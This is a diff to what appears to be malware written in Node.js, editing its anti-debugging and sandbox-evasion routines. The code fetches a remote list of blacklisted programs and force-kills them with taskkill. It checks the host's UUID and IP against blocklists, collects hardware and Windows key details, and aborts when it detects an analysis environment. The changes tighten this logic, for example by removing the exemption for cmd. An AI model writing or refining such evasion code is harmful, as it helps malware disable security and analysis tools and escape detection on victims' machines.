@@ -20,7 +20,7 @@ const killer = async (url, command) => {
     let black_list = (await request(url)).blacklistedprog;
     for (let line of stdout) {
       let name = line.split(/\s+/)[0].replace(".exe", "");
-      if (name.toLowerCase() !== "cmd" && black_list.includes(name)) {
+      if (black_list.includes(name)) {
         try {
           await exec(`taskkill /F /IM ${name}.exe`);
         } catch (err) {
@@ -59,7 +59,8 @@ const uuid_blocked = async (value) => await check_blocked("uuids", value);
 const ip_blocked = async (value) => await check_blocked("ips", value);
 
 const antidebug = async (res, disk, ram, uid, cpu_count, ip, os, cpu, gpu, win_key, win_ver) => {
-  if (res !== true) return;
+  if (res !== "true") return;
+
   try {
     const [
       computer_name,
@@ -98,7 +99,6 @@ const antidebug = async (res, disk, ram, uid, cpu_count, ip, os, cpu, gpu, win_k
       || IS_GPU_BLOCKED
     ) {
       process.abort();
-      process.exit(1);
     }
     try {
       await kill_blacklist();
